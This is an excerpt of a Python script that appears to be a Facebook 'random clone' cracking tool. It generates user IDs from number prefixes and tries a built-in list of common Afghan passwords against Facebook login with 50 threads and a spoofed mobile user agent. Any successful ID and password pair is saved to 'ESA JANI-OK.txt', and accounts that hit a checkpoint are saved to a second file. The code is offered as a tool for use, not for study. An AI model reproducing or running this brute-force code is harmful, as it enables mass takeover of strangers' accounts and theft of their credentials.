...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93764943352?text=MR.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM CLONE \x1b[1;32m BEST')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;31m Code example: 9370,9379,9378,9377,9374,')
    lines()
    ...
    print(logo)
    lines()
    limit = int(input('\033[1;31m example: 1000, 2000, 3000, 5000,\n\033[1;37m put limit: '))
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        print(' Selected Code :\x1b[1;93m '+kode)
        print("\033[1;37m \x1b[1;93mUse flight mode for speed up\033[1;37m")
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'۱۲۳۴۵۶','Afghan12345','50006000','500500','700800','afghanistan','Afghanistan','kabul12345','۱۲۳۴۵۶۷۸۹','khan123','khan12345','khan1234','100200','kabul1234','afghan1234']
...
def rcrack(uid,pwx,tl):
    ...
    'referer': 'https://developers.facebook.com/tools/',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ESA JANI-XD] '+cid+' | '+ps+'\033[0;97m')
                open('ESA JANI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ESA JANI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ESA JANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mESA JANI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
